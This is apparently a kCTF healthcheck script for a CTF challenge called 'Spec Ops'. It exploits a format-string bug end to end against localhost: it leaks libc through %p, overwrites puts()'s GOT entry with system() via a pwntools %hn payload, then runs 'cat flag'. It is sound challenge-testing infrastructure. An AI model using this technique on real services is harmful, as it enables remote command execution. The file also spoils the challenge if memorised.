#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
healthcheck.py -- Spec Ops kCTF healthcheck

Actually exploits the format-string bug end to end:

  1. field report #1: leak a libc return address off the stack with a
     positional %p, and turn it into a libc base address.
  2. field report #2: use pwntools' fmtstr_payload() to build a %hn
     write that overwrites puts()'s GOT entry with system()'s address
     (this is the literal "Build %n payload via pwntools" step from the
     challenge's own design notes).
  3. closing message: puts() has been hijacked into system(), so
     whatever we send here runs as a shell command. We run `cat flag`
     and confirm it comes back.

Exit code 0 = healthy, non-zero = broken.
"""

import pwnlib.tubes
from pwn import fmtstr_payload

# --- constants tied to this specific build (ubuntu:24.04, glibc 2.39) ---
# Re-derive both if the base image is ever bumped -- see README.md,
# "Re-deriving the constants" for exact commands.
GOT_PUTS = 0x404008
LEAK_ARG_INDEX = 27          # `%27$p` reliably leaks a libc return address
LEAK_TO_BASE_OFFSET = 0x92ef3  # leaked_value - libc_base
SYSTEM_OFFSET = 0x58750        # system() - libc_base
WRITE_BASE_ARG_INDEX = 8       # `field_report()`'s own buffer starts at $8


def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))


r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)

print(r.recvuntil(b'== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)

# --- round 1: leak libc ---
r.recvuntil(b'Enter field report #1: ')
r.send(("%%%d$p" % LEAK_ARG_INDEX).encode() + b"\n")

leak_line = r.recvline().strip()
leaked = int(leak_line, 16)
libc_base = leaked - LEAK_TO_BASE_OFFSET
system_addr = libc_base + SYSTEM_OFFSET
print("leak: %#x  libc_base: %#x  system(): %#x" % (leaked, libc_base, system_addr))

# --- round 2: GOT[puts] = system() ---
r.recvuntil(b'Enter field report #2: ')
payload = fmtstr_payload(WRITE_BASE_ARG_INDEX, {GOT_PUTS: system_addr}, write_size='short')
r.send(payload + b"\n")
r.recvline()  # the format string's own leftover echo, discarded

# --- trigger: puts() is now system() ---
r.recvuntil(b'Enter closing message: ')
r.send(b"cat flag\n")

out = r.recvuntil(b'CTF{', timeout=5) + r.recvuntil(b'}', timeout=5)
print(out)
assert b'CTF{' in out and b'}' in out, "flag not recovered -- exploit failed"

exit(0)
